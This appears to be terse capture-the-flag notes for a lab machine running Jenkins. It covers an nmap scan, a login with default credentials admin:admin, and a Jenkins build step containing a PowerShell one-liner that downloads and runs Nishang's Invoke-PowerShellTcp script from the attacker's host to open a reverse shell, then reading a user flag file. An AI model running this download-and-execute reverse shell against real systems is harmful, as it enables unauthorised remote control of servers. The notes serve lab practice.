1)
- nmap IP
- 3
2)
- I dont know how you were meant to do this but I just tried the first thing that came to mind and it worked, admin:admin
3)
- go to projec history > project 1 > configure, or /job/project/configure
- scroll down to where it says "build execute windows batch command"
- python -m SimpleHTTPServer 80
- nc -lvnp 80
- enter the following in the box 
- powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.13.209:80/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.13.209 -Port 1234
- apply > build now
4)
- cat /Users/bruce/Desktop/user.txt
